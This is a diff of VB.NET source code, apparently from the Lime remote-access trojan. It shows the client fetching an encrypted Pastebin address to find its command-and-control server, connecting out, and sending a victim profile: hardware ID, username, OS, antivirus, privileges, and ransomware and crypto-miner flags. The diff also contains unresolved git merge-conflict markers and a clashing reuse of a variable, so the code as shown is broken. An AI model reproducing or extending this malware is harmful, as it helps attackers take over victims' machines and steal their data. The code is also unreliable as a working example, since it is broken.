@@ -1,6 +1,4 @@
-﻿Imports System.Collections.Generic
-
-Namespace Lime
+﻿Namespace Lime
 
     Public Class C_TcpClient
         Public Shared ENDOF As String = C_Settings.ENDOF
@@ -10,9 +8,14 @@ Namespace Lime
         Public Shared T1 As New Threading.Thread(AddressOf Connect)
         Public Shared isConnected As Boolean = False
         Public Shared MS As IO.MemoryStream = Nothing
+<<<<<<< HEAD
         Public Shared Tick As Threading.Timer = Nothing
         Public Shared x As Integer = 0
         Public Shared P As New List(Of Integer)
+=======
+        Public Shared Tick As System.Threading.Timer = Nothing
+        Public Shared KA As Integer = 0
+>>>>>>> parent of 19710ea... UPDATE v0.1.8.5C
 
         Public Shared Sub Connect()
 
@@ -89,31 +92,31 @@ re:
                 C_Settings.HOST = "127.0.0.1"
                 C_Settings.PORT = 8989
 #Else
-
                 Using WC As New Net.WebClient 'Pastebin, split by ":" IP:PORT
                     Try
                         Dim myCredentials As New Net.NetworkCredential("", "")
                         WC.Credentials = myCredentials
                         Dim Response As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
-                        ' Dim Response As String = WC.DownloadString((C_Settings.Pastebin))
-                        Dim SPL = Split(Response, ":")
-                        C_Settings.HOST = SPL(0)
-                        Dim r As New Random
-                        C_Settings.PORT = SPL(New Random().Next(1, SPL.Length))
+                        C_Settings.HOST = Response.Split(":")(0)
+                        C_Settings.PORT = Response.Split(":")(1)
                         WC.Dispose()
                     Catch ex As Exception
                     End Try
                 End Using
 
 #End If
-
                 C.Connect(C_Settings.HOST, C_Settings.PORT)
                 isConnected = True
                 MS = New IO.MemoryStream
 
+<<<<<<< HEAD
                 Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.9.1", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL,
                                   C_ID.USBSP, SPL, C_Settings.PORT, SPL, C_ID.dotNET, SPL, "...", SPL, " ", SPL,
+=======
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.5B", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                                  C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, C_Settings.PORT, SPL, C_ID.dotNET, SPL, "...", SPL, " ", SPL,
+>>>>>>> parent of 19710ea... UPDATE v0.1.8.5C
                                   C_ID.Privileges.ToString, SPL, C_Settings.fullpath))
 
                 Dim T As New Threading.TimerCallback(AddressOf PING)
